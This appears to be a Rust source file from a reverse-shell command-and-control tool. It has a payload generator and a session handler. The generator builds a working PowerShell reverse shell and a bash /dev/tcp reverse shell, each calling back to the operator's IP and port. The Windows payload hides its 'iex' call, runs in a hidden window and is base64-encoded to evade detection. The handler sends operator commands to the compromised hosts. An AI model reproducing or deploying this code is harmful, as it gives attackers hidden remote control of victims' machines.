use server_core::Server;
use std::sync::Arc;
use std::io::{self, Write};
use std::net::{IpAddr, Shutdown};
use rustyline::Editor;
use cli_clipboard::{ClipboardContext, ClipboardProvider};

use base64::{engine::general_purpose, Engine as _};
use local_ip_address::local_ip;

/*Create Custom Payloads */

static PAYLOAD_WINDOWS: &str = r#""#;  /*You can create your own custom payload (it will overwrite the default one unless you leave it empty again)  */
static PAYLOAD_LINUX: &str = r#""#;    /*You can create your own custom payload (it will overwrite the default one unless you leave it empty again)  */

/*Create Custom Payloads */

pub fn generate_payload(ip: &str, port: &str, os: &str) -> String {
    
    let ip_address: IpAddr;
    let mut clipboard = ClipboardContext::new().expect("[\x1b[31;1m!\x1b[0m]Failed to initialize clipboard");

    if ip == "0.0.0.0" || ip == "127.0.0.1" {
        ip_address = local_ip().unwrap();
    } else {
        ip_address = ip.parse().unwrap();
    }

    println!("\n\x1b[38;5;11mThe payload has been copied to the clipboard....\x1b[0m\n");

    match os {
        "Windows" | "windows" => {

            if PAYLOAD_WINDOWS.is_empty() {
            
                let plain_payload = format!(
                    r#"Start-Process $PSHOME\powershell.exe -ArgumentList {{$var9876543210=New-Object System.Net.Sockets.TCPClient('{}',{});$var1234567890=$var9876543210.GetStream();[byte[]]$var112233445566=0..65535|%{{0}};while(($var9988776655=$var1234567890.Read($var112233445566,0,$var112233445566.Length))-ne0){{ $var5566778899=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($var112233445566,0,$var9988776655);$var4433221100=(i""e''x $var5566778899 2>&1|Out-String);$var4455667788=$var4433221100+'PS '+ {} + '> ';$var2244668800=([text.encoding]::ASCII).GetBytes($var4455667788);$var1234567890.Write($var2244668800,0,$var2244668800.Length);$var1234567890.Flush();}};$var9876543210.Close()}} -WindowStyle Hidden"#,
                    ip_address, port, "$pwd"
                );

                let utf16: Vec<u16> = plain_payload.encode_utf16().collect();
                let mut utf16_bytes: Vec<u8> = Vec::new();

                for code_point in utf16 {
                    utf16_bytes.push((code_point & 0xFF) as u8);
                    utf16_bytes.push((code_point >> 8) as u8);
                }

                let payload = format!("powershell -e {}\n", general_purpose::STANDARD.encode(utf16_bytes));
                clipboard.set_contents(payload.clone()).expect("\x1b[31;1m:( Failed to copy payload to clipboard\x1b[0m");
            
                return payload.clone();
            } 
            else {
                clipboard.set_contents(PAYLOAD_WINDOWS.to_string()).expect("\x1b[31;1m:( Failed to copy payload to clipboard\x1b[0m");
        
                return PAYLOAD_WINDOWS.to_string();
            }
        }
        "Linux" | "linux" => {

            if PAYLOAD_LINUX.is_empty() {
                let payload = format!("0<&196;exec 196<>/dev/tcp/{}/{}; sh <&196 >&196 2>&196", ip_address, port);
                clipboard.set_contents(payload.clone()).expect("\x1b[31;1m:( Failed to copy payload to clipboard\x1b[0m");
             
                return payload.clone();
            } 
            else {
                clipboard.set_contents(PAYLOAD_LINUX.to_string()).expect("\x1b[31;1m:( Failed to copy payload to clipboard\x1b[0m");
             
                return PAYLOAD_LINUX.to_string();
            }
        }
        _ => {
            return "\n[\x1b[32;1mX\x1b[0m] Not supported!\n".to_string();
        }
    }
}

pub fn connect_to_shell(server: &Server, id: &str) {
    
    let mut connections = server.connections.lock().unwrap();

    if let Some(connection) = connections.get_mut(id) {
        if connection.active && !connection.suspended {
            
            let mut stream_clone_for_commands: std::net::TcpStream = connection.stream.try_clone().unwrap();
            let id_cloned: String = id.to_string();
            let stdout_mutex: Arc<std::sync::Mutex<()>> = Arc::clone(&server.stdout_mutex);
            
            let mut rl: Editor<(), rustyline::history::FileHistory> = Editor::new().unwrap();

            {
                let _lock = stdout_mutex.lock().unwrap();
                println!("[\x1b[32;1m✓\x1b[0m] Connected to {}\n", id_cloned);
                io::stdout().flush().unwrap();
            }
            
            {
                stream_clone_for_commands.write_all(format!("\n").as_bytes()).unwrap();
                stream_clone_for_commands.flush().unwrap();
            }

            loop {
                let readline: Result<String, rustyline::error::ReadlineError> = rl.readline("");

                match readline {
                    Ok(command) => {
            
                        let _ = rl.add_history_entry(command.as_str());
                        let command = command.trim();
                        
                        if command == "exit" {
                        
                            stream_clone_for_commands.shutdown(Shutdown::Both).unwrap();
                            connection.active = false;

                            {
                                let _lock: std::sync::MutexGuard<'_, ()> = stdout_mutex.lock().unwrap();
                                println!("\x1b[31;3mSession Ended!\x1b[0m");
                                io::stdout().flush().unwrap();
                            }

                            break;
                        } 
                        else if command == "suspend" {
                        
                            connection.suspended = true;

                            {
                                let _lock: std::sync::MutexGuard<'_, ()> = stdout_mutex.lock().unwrap();
                                println!("\x1b[33;1m[!] Connection Suspended!\x1b[0m");
                                io::stdout().flush().unwrap();
                            }

                            break;
                        } 
                        else {
                        
                            if command.is_empty() {
                                stream_clone_for_commands.flush().unwrap();
                            } 

                            if !connection.suspended {
                                stream_clone_for_commands.write_all(format!("{}\n", command).as_bytes()).unwrap();
                                stream_clone_for_commands.flush().unwrap();
                            }
                        }
                    }
                    Err(_) => break,
                }
            }
        } 
        else if connection.suspended {
            let _lock: std::sync::MutexGuard<'_, ()> = server.stdout_mutex.lock().unwrap();
            println!("\x1b[34;1m[!]\x1b[0m Session {} is Suspended", id);
        
            io::stdout().flush().unwrap();
        } 
        else {
            let _lock: std::sync::MutexGuard<'_, ()> = server.stdout_mutex.lock().unwrap();
            println!("\x1b[31;1m[X]\x1b[0m Session {} is not Active", id);
        
            io::stdout().flush().unwrap();
        }
    } 
    else {
        let _lock: std::sync::MutexGuard<'_, ()> = server.stdout_mutex.lock().unwrap();
        println!("\x1b[31;1m[X]\x1b[0m No Session with ID={} was found!", id);
    
        io::stdout().flush().unwrap();
    }
}
